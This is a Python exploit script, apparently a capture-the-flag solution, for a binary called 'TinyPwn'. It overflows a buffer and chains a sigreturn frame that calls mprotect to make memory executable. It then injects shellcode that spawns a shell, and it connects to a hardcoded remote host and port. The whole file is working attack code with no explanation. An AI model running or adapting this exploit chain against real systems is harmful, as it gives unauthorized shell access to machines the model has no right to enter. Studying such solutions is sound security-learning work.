#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './TinyPwn'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'159.65.125.233', 'port':6009})
env.select()

#==========

addr_bin_base           = 0x400000
addr_start              = 0x4000b0
addr_function           = 0x4000f2

constants.SYS_syncfs    = 0x132

#==========

def attack(conn):
    exploit  = '\x01'*0x128
    exploit += p64(addr_start)          # 1
    exploit += p64(addr_function)       # 3 
    exploit += p64(addr_function)       # 4 
    conn.send(exploit)
    sleep(0.2)

    frame = SigreturnFrame()
    frame.rax = constants.SYS_mprotect
    frame.rdi = addr_bin_base
    frame.rsi = 0x1000
    frame.rdx = 0x7
    frame.rsp = addr_bin_base + 0x170 - 0x128
    frame.rip = addr_bin_base + 0x101

    exploit  = ('\x02'*0x18 + str(frame)).ljust(0x128, '\x00')
    exploit += p64(addr_function)       # 2
    exploit += p64(addr_function)       # 3
    conn.send(exploit[:constants.SYS_syncfs])
    sleep(0.2)

    conn.send('\x03'*constants.SYS_rt_sigreturn)
    sleep(0.2)

    shellcode = asm(shellcraft.sh())
    conn.send('\x90'*0xbb + shellcode)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
